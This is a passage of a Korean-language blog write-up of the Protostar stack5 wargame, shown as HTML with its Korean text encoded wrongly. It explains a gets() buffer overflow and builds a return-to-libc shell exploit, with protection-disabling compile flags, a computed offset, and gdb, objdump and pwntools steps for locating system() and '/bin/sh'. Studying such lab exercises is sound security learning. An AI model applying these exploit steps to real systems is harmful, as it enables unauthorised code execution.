&lt;p&gt;ì‚¬ìš©ìì˜ ì…ë ¥ê°’ì„ ë°›ì•„ ì§€ì—­ ë³€ìˆ˜ì— ì €ì¥í•˜ëŠ” ê°„ë‹¨í•œ í”„ë¡œê·¸ë¨ì´ë‹¤. ê·¸ëŸ°ë°, ì‚¬ìš©ìì˜ ì…ë ¥ê°’ì„ ë°›ì„ ë•Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; í•¨ìˆ˜ë¥¼ ì‚¬ìš©í–ˆë‹¤ëŠ” ì ì—ì„œ ë¬¸ì œê°€ ìˆë‹¤. í”íˆ Boundary checkë¼ê³  í•˜ëŠ” ì‚¬ìš©ì ì…ë ¥ê°’ ê¸¸ì´ í™•ì¸ì„ í•˜ì§€ ì•ŠëŠ” í•¨ìˆ˜ì´ê¸° ë•Œë¬¸ì´ë‹¤. ì¦‰, ìœ„ í”„ë¡œê·¸ë¨ì˜ ë¬¸ì œëŠ” gets í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•œ ê²ƒìœ¼ë¡œ, í•´ë‹¹ í•¨ìˆ˜ëŠ” ì‚¬ìš©ìê°€ ì£¼ëŠ” ëŒ€ë¡œ ì „ë¶€ ë°›ì•„ ì €ì¥í•˜ê¸° ë•Œë¬¸ì— Buffer Overflow ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” í•¨ìˆ˜ì´ê¸° ë•Œë¬¸ì— ìœ„ í”„ë¡œê·¸ë¨ ë˜í•œ BOF ì·¨ì•½ì ì„ ê°€ì§€ê²Œ ë˜ì—ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;132-bof-ì·¨ì•½ì -ìµìŠ¤í”Œë¡œì‡í• -ë°©ë²•-ì§€ì •&quot;&gt;1.3.2. BOF ì·¨ì•½ì  ìµìŠ¤í”Œë¡œì‡í•  ë°©ë²• ì§€ì •&lt;/h3&gt;

&lt;p&gt;ì´ë²ˆì—ëŠ” BOFì™€ ì—°ê³„í•œ RTL ë°©ì‹ìœ¼ë¡œ ì‰˜ì„ ë”¸ ê²ƒì´ë‹¤. BOF-RTLì— ì‚¬ìš©ë  í˜ì´ë¡œë“œê°€ ì•„ë˜ì™€ ê°™ê¸° ë•Œë¬¸ì—, ì„±ê³µì‹œí‚¤ê¸° ìœ„í•´ ì•Œì•„ì•¼ë§Œ í•˜ëŠ” ì •ë³´ëŠ”&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ëª‡ ë°”ì´íŠ¸ë¥¼ ë„£ì–´ì•¼ EBPê¹Œì§€ë¥¼ ì˜¤ì—¼ì‹œí‚¬ ìˆ˜ ìˆëŠ”ê°€&lt;/li&gt;
  &lt;li&gt;Libcì˜ ì–´ë–¤ í•¨ìˆ˜ë¥¼ ì“¸ ê²ƒì¸ê°€&lt;/li&gt;
  &lt;li&gt;í•´ë‹¹ í•¨ìˆ˜ì˜ ë©”ëª¨ë¦¬ìƒ ì£¼ì†ŒëŠ” ë¬´ì—‡ì¸ê°€&lt;/li&gt;
  &lt;li&gt;Libc ë‚´ë¶€ì— í•´ë‹¹ í•¨ìˆ˜ê°€ ì‰˜ì„ ì‹¤í–‰ì‹œí‚¤ë„ë¡ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” íŒŒë¼ë¯¸í„°ê°€ í•˜ë“œì½”ë”©ë˜ì–´ ìˆëŠ”ê°€&lt;/li&gt;
  &lt;li&gt;ê·¸ë ‡ë‹¤ë©´ í•´ë‹¹ íŒŒë¼ë¯¸í„°ëŠ” ì–´ë””ì— ìˆëŠ”ê°€&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ì´ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;1.3.2.1. offset bytes êµ¬í•˜ê¸°&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;pwndbgë¥¼ stack5ì— ë¬¼ë ¤ ë³´ì•˜ë‹¤. ì»´íŒŒì¼ ì˜µì…˜ì€ ì•„ë˜ì™€ ê°™ë‹¤.(ì£¼ì˜!! ì•„ë˜ ì»´íŒŒì¼ ì˜µì…˜ì„ ì‚¬ìš©í•˜ë©´ ì•ˆëœë‹¤! &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-mpreferred-stack-boundary=2&lt;/code&gt; ë¡œ í•´ì•¼ í•œë‹¤!!!! ì´ìœ ëŠ” ë§ˆì§€ë§‰ì— ê°€ì„œ ì„¤ëª…í•˜ê² ë‹¤)&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gcc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mpreferred&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;boundary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fno&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protector&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execstack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fno&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pic&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disas main&lt;/code&gt; ëª…ë ¹ì–´ë¡œ ì–»ì€ ì–´ì…ˆë¸”ë¦¬ ë¤í”„ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;main í•¨ìˆ˜ê°€ íŒŒë¼ë¯¸í„°ë¥¼ ë°›ëŠ” í˜•ì‹ì´ë¼ í•´ë‹¹ íŒŒë¼ë¯¸í„°ë¥¼ ë‚´ë¶€ì ìœ¼ë¡œ ì²˜ë¦¬í•˜ê¸° ìœ„í•´ ê³µê°„ì„ í™•ë³´í•œë‹¤. ê·¸ëŸ¬ë‚˜ ê·¸ê²ƒì— ì‹ ê²½ì“¸ í•„ìš” ì—†ì´, gets ì‹¬ë³¼ì´ ë”¸ë¦° call ì§ì „ì˜ ì–´ì…ˆë¸”ë¦¬ì–´ì— ì§‘ì¤‘í•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;getsëŠ” íŒŒë¼ë¯¸í„°ë¡œ char* ë²„í¼ì˜ ì‹œì‘ ì£¼ì†Œë¥¼ ë°›ëŠ”ë‹¤. íŒŒë¼ë¯¸í„°ê°€ í•˜ë‚˜ë¿ì´ë¯€ë¡œ cdecl ê·œì•½ì— ë”°ë¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*(main+24)&lt;/code&gt;ì—ì„œ ìŠ¤íƒì— push ë˜ëŠ” ë¶€ë¶„ì´ íŒŒë¼ë¯¸í„°ë¥¼ ìŠ¤íƒì— ë„£ëŠ” í–‰ìœ„ì¼ ê²ƒì´ë‹¤. eaxì— ìˆëŠ” ê°’ì„ ë„£ê¸° ë•Œë¬¸ì— eaxì— ë¬´ìŠ¨ ê°’ì´ ë“¤ì–´ê°€ëŠ”ì§€ ë”°ë¼ê°€ ë³´ë©´, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ebp-0x48]&lt;/code&gt; ì„ lea ëª…ë ¹ì–´ë¥¼ ì´ìš©í•´ eaxì— ì£¼ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. lea ëª…ë ¹ì–´ë¥¼ ì´ìš©í–ˆìœ¼ë¯€ë¡œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ebp-0x48]&lt;/code&gt; ì€ ì£¼ì†Œë¡œì„œ ì·¨ê¸‰ëœë‹¤. ì¦‰, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ebp-0x48]&lt;/code&gt; ì´ ë°”ë¡œ BOFì„ ì¼ìœ¼í‚¬ ì‹œì‘ ì£¼ì†Œê°€ ëœë‹¤.&lt;/p&gt;

&lt;p&gt;buffer ë³€ìˆ˜ëŠ” 64byteì¸ë° ì™œ 0x48, ì¦‰ 64+8 byte ë§Œ ì£¼ëŠ”ì§€ ê¶ê¸ˆí•  ìˆ˜ ìˆë‹¤. ì´ì „ í¬ìŠ¤íŠ¸ì—ì„œë„ ì–¸ê¸‰í•œ ê²ƒì²˜ëŸ¼, gcc ì»´íŒŒì¼ëŸ¬ê°€ ë³´ì•ˆ ì •ì±…ì˜ ì¼í™˜ìœ¼ë¡œ ë¬¸ì ë°°ì—´ì„ ë§Œë“¤ ë•Œ ì¶”ê°€ì ìœ¼ë¡œ ê³µê°„ì„ ë” í• ë‹¹í•´ ì£¼ê¸° ë•Œë¬¸ì´ë‹¤. ì¼ë°˜ì ìœ¼ë¡œ 8 byte~16 byte ì •ë„ì˜ ê³µê°„ì„ ë” ì£¼ëŠ” ê²ƒìœ¼ë¡œ ì•Œê³  ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ, 0x48byteë¥¼ ëª¨ë‘ ì±„ìš°ë©´ ebpì˜ ë°”ë¡œ ìœ„ê¹Œì§€ë¥¼ ë³€ì¡°í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ìš°ë¦¬ê°€ ì£¼ì–´ì•¼ í•  &lt;strong&gt;offset byteëŠ” 0x48+0x4 = 0x4c byte&lt;/strong&gt;ê°€ ë  ê²ƒì´ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1.3.2.2. Library Function Addressì™€ parameter ë¡œ ì“¸ ë¬¸ìì—´ ì£¼ì†Œ êµ¬í•˜ê¸°&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ë¨¼ì € ì‰˜ì„ ë”°ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” libc ë‚´ë¶€ í•¨ìˆ˜ë“¤ì´ ë§ì§€ë§Œ, ì´ë²ˆì—ëŠ” system()í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ ë³´ë ¤ í•œë‹¤. system() í•¨ìˆ˜ì˜ ì‚¬ìš© ê·œì•½ì€ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://man7.org/linux/man-pages/man3/system.3.html&quot;&gt;Document&lt;/a&gt;ì— ë”°ë¥´ë©´, system() í•¨ìˆ˜ëŠ” fork(2) ì‹œìŠ¤í…œ ì½œì„ ì´ìš©í•´ execl(3) í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ëŠ” child processë¥¼ ë§Œë“¤ì–´ ì•„ë˜ì™€ ê°™ì€ ì»¤ë§¨ë“œë¥¼ ì‹¤í–‰í•œë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;execl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì¦‰ command ë³€ìˆ˜ì— ë“¤ì–´ê°„ ë¬¸ìì—´ì— í•´ë‹¹ë˜ëŠ” ì‰˜ ëª…ë ¹ì–´ê°€ ì‹¤í–‰ëœë‹¤. ë‚˜ëŠ” ì‰˜ì„ ì‹¤í–‰í•˜ê³  ì‹¶ê¸° ë•Œë¬¸ì— /bin/shë¥¼ ë„£ì–´ì•¼ í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ë ‡ë‹¤ë©´ system() í•¨ìˆ˜ì˜ ì£¼ì†Œì™€ íŒŒë¼ë¯¸í„°ë¡œ ë“¤ì–´ê°ˆ â€œ/bin/shâ€ ë¬¸ìì—´ì´ í•˜ë“œì½”ë”©ë˜ì–´ ìˆëŠ” ì£¼ì†ŒëŠ” ì–´ë–»ê²Œ êµ¬í•  ìˆ˜ ìˆì„ê¹Œ. í¬ê²Œ ì„¸ ê°€ì§€ ë°©ì‹ì´ ìˆë‹¤. 1) gdbë¥¼ ì´ìš©í•˜ê¸° 2) libcì—ì„œ ì°¾ê¸° 3) pwntools ì´ìš©í•´ libc ë’¤ì§€ê¸°.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;gdb ì´ìš©í•˜ê¸°&lt;/p&gt;

    &lt;p&gt;í”„ë¡œê·¸ë¨ì´ ì‹œì‘í•´ì•¼ ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ë©”ëª¨ë¦¬ì— ë¡œë”©ë˜ê¸° ë•Œë¬¸ì— í”„ë¡œê·¸ë¨ì„ ëŒë ¤ë†“ê³  systemì˜ ì£¼ì†Œë¥¼ ì°¾ì•„ì•¼ í•œë‹¤. ê·¸ëŸ¬ë‚˜ ê·¸ëƒ¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; ëª…ë ¹ì–´ë¡œ í”„ë¡œê·¸ë¨ì„ ëŒë ¤ë²„ë¦¬ë©´ í”„ë¡œê·¸ë¨ì´ ëë‚˜ë²„ë ¤ì„œ ë©”ëª¨ë¦¬ì— ë¡œë”©ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë„ ì¦ë°œí•œë‹¤. ë”°ë¼ì„œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b main&lt;/code&gt; ëª…ë ¹ì–´ë¡œ ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ë¥¼ ê±¸ê³  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•œë‹¤.&lt;/p&gt;

    &lt;p&gt;ì´í›„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p system&lt;/code&gt; ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•˜ë©´ ì•„ë˜ì™€ ê°™ì€ ê²°ê³¼ë¥¼ ë³¼ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;ì´ì œ â€˜/bin/shâ€™ ë¬¸ìì—´ì„ ì°¾ì•„ì•¼ í•œë‹¤. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find &amp;amp;system,+999999999,&quot;/bin/sh&quot;&lt;/code&gt; ëª…ë ¹ì–´ë¥¼ ì´ìš©í•˜ë©´ ì‰½ê²Œ ì°¾ì„ ìˆ˜ ìˆë‹¤. system í•¨ìˆ˜ì˜ ì‹œì‘ ì£¼ì†Œë¶€í„° ëª…ì‹œëœ ìˆ«ìë§Œí¼ ì˜¬ë ¤ê°€ë©° ì£¼ì–´ì§„ ë¬¸ìì—´ì„ ì°¾ìœ¼ë¼ëŠ” ëª…ë ¹ì–´ë‹¤.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;libcì—ì„œ ì°¾ê¸°&lt;/p&gt;

    &lt;p&gt;íƒ€ê²Ÿ í”„ë¡œê·¸ë¨ì´ ì‚¬ìš©í•˜ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ì™€ ê·¸ê²ƒì´ ì ì¬ë˜ëŠ” ì£¼ì†Œë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldd {program_name}&lt;/code&gt; ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•œë‹¤.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;libc ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ë””ë ‰í† ë¦¬ìƒì˜ ìœ„ì¹˜ì™€ ì‹¤ì§ˆ ë©”ëª¨ë¦¬ìƒ ì ì¬ ìœ„ì¹˜ë¥¼ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

    &lt;p&gt;ê·¸ëŸ¼ objdumpë¥¼ ì´ìš©í•´ libc.so.6 ìƒì— ìœ„ì¹˜í•˜ëŠ” system í•¨ìˆ˜ì˜ ì˜¤í”„ì…‹ì„ ì•Œì•„ë‚´ë©´ ëœë‹¤.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x3d3d0&lt;/code&gt;ì´ system í•¨ìˆ˜ì˜ ì˜¤í”„ì…‹ì¸ ê²ƒì²˜ëŸ¼ ë³´ì¸ë‹¤. ì‹¤ì œë¡œ libc.so.6ì˜ ì‹œì‘ ì£¼ì†Œì¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xf7dde000&lt;/code&gt; ì— ì˜¤í”„ì…‹ì¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x3d3d0&lt;/code&gt;ì„ ë”í•˜ë©´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xf7e1b3d0&lt;/code&gt;ìœ¼ë¡œ system í•¨ìˆ˜ì˜ ì‹œì‘ ì£¼ì†Œê°€ ë§ë‹¤.&lt;/p&gt;

    &lt;p&gt;ê·¸ëŸ°ë° ê¶ê¸ˆì¦ì´ ìƒê¸´ë‹¤. ì €ê¸° libc_system ë’¤ì— ë¶™ì–´ ìˆëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@@GLIBC_PRIVATE&lt;/code&gt;ê°€ ëŒ€ì²´ ë­ì§€? ê¶ê¸ˆí•´ì„œ ì•Œì•„ë³´ë‹ˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@@&lt;/code&gt;ëŠ” default ë²„ì „ì„ì„ ì˜ë¯¸í•˜ê³ , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GLIBC_PRIVATE&lt;/code&gt; ì‹¬ë³¼ì€ ë¼ì´ë¸ŒëŸ¬ë¦¬ ë§ì»¤ ë‚´ì—ì„œë§Œ ì‚¬ìš©ë˜ëŠ” ë‚´ë¶€ ê·œì•½ìœ¼ë¡œ ë§ì»¤ê°€ ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬ë“¤ë¼ë¦¬ ì„œë¡œë¥¼ refer í•  ë•Œ ì“°ëŠ” ì¸í„°í˜ì´ìŠ¤ì˜ wrapperë¥¼ ì˜ë¯¸í•œë‹¤ëŠ” ì ì„ ì•Œê²Œ ë˜ì—ˆë‹¤.&lt;/p&gt;

    &lt;p&gt;ì‚¬ì‹¤ ê³„ì‚°ì„ ì˜ëª» í•´ì„œ objdumpë¡œ ì•Œì•„ë‚¸ system í•¨ìˆ˜ì˜ ì ì¬ ì£¼ì†Œì™€ gdbë¡œ ì•Œì•„ë‚¸ ì£¼ì†Œê°€ ë‹¤ë¥¸ ì¤„ ì•Œê³  ì›ì¸ì„ ì•Œì•„ë‚´ê³  ì‹¶ì–´ ì‚½ì§ˆì„ ì—„ì²­ë‚˜ê²Œ í•˜ëŠ” ë°”ëŒì— ë¦¬ëˆ…ìŠ¤ì˜ íŒŒì¼ ë§í¬ì™€ ë§ì»¤-ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬ ê°„ì˜ í˜¸ì¶œì— ëŒ€í•´ ê³µë¶€í•˜ê²Œ ë˜ì—ˆëŠ”ë°, í•´ë‹¹ ë‚´ìš©ì€ ë§¨ ë°‘ì—ì„œ ìì„¸íˆ ì„¤ëª…í•œë‹¤.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;pwntools ì‚¬ìš©í•´ libc ë’¤ì§€ê¸°&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/i386-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;ìœ„ì˜ ì½”ë“œë¥¼ ì´ìš©í•˜ë©´ ì•„ë˜ì™€ ê°™ì€ ê²°ê³¼ê°€ ë‚˜ì˜¨ë‹¤.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

